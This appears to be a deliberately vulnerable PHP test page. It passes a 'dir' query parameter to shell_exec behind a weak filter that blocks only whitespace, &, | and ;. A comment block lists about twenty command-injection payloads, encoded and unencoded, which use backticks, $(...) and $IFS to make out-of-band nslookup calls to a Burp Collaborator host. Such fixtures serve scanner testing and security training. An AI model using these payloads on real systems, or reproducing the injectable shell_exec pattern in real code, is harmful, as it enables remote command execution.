<?php
# filename: no_white_chars_no_colon_no_pipe_no_ampersand.php
# vulnerable with newline as command separator
# sample payloads:
/*
."`nslookup$IFS$9a1372.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net`".
%24%28nslookup%24IFS%249a203.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net%29%00
`nslookup$IFS$9a232.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net`&
$(nslookup$IFS$9a25.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net)
.%22%24%28nslookup%24IFS%249a1364.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net%29%22.
.%24%28nslookup%24IFS%249a1358.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net%29.
`nslookup$IFS$9a220.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net`=©
%24%28nslookup%24IFS%249a200.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net%29%F0%9F%92%A9
%60nslookup%24IFS%249a224.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net%60%00
$(nslookup$IFS$9a211.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net)&
.$(nslookup$IFS$9a1357.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net).
."$(nslookup$IFS$9a1363.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net)".
`nslookup$IFS$9a28.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net`
%60nslookup%24IFS%249a29.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net%60
$(nslookup$IFS$9a199.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net)=©
.%60nslookup%24IFS%249a1367.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net%60.
.%22%60nslookup%24IFS%249a1373.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net%60%22.
%60nslookup%24IFS%249a221.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net%60%F0%9F%92%A9
%24%28nslookup%24IFS%249a26.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net%29
.`nslookup$IFS$9a1366.fdwh2lqdvk955fe01zhtyr5zeqkn8c.burpcollaborator.net`.
*/
 
if(isset($_GET['dir'])&&!preg_match('/\s+/',$_GET['dir'])&&!preg_match('/&|\||;/',$_GET['dir']))
{
	 echo "Dir contents are:\n<br />".shell_exec("ls {$_GET['dir']}");
}
?>
<a href="?dir=.">clickme</a>
